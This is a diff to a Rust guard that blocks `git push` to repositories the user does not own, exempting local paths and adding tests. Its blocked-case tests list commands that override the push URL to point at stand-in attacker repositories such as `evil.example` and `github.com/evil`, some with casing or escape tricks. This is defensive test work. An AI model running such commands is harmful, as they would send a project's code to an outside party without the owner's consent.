@@ -467,9 +467,13 @@ fn check_pushes_elsewhere(
              remote first with `git remote set-url`.",
         ));
     }
+    // Judged as the same value named directly would be: a URL is
+    // ownership-checked, and a local path (`/srv/x.git`) is not a remote to
+    // own, exactly as `git push /srv/x.git main` falls back.
     for push in &pushes {
         for url in &push.config_destinations {
-            if !check_owner(url, allowed_owners, allowed_repos, extra_hosts) {
+            let url_shaped = host_and_repo_from_url(url).is_some() || looks_like_push_url(url);
+            if url_shaped && !check_owner(url, allowed_owners, allowed_repos, extra_hosts) {
                 return Some(CheckResult::block(unowned_message(
                     url,
                     &push.work_dir,
@@ -2025,6 +2029,8 @@ mod tests {
             for command in [
                 "git -c remote.origin.pushurl=https://evil.example/x.git push origin main",
                 "git -c remote.origin.pushurl=https://github.com/evil/x.git push origin main",
+                "git -c remote.origin.pushurl=git@github.com:evil/x.git push origin main",
+                "git -c remote.origin.pushurl=file:///srv/x.git push origin main",
                 "git -c remote.origin.url=https://github.com/evil/x.git push origin main",
                 "git -c Remote.origin.PushURL=https://github.com/evil/x.git push origin main",
                 "git -c remote.origin.push\\url=https://github.com/evil/x.git push origin main",
@@ -2057,6 +2063,10 @@ mod tests {
             for command in [
                 "git push origin main",
                 "git -c remote.origin.pushurl=https://github.com/cameronsjo/other.git push origin main",
+                // A local path, as `git push /srv/x.git main` is.
+                "git -c remote.origin.pushurl=/srv/x.git push origin main",
+                "git -c remote.origin.pushurl=/x push origin",
+                "git push /srv/x.git main",
                 "git -c color.ui=false push origin main",
                 "git -c user.name=x -c core.pager=cat push origin main",
                 "git -c url.x.insteadof.note=y push origin main",
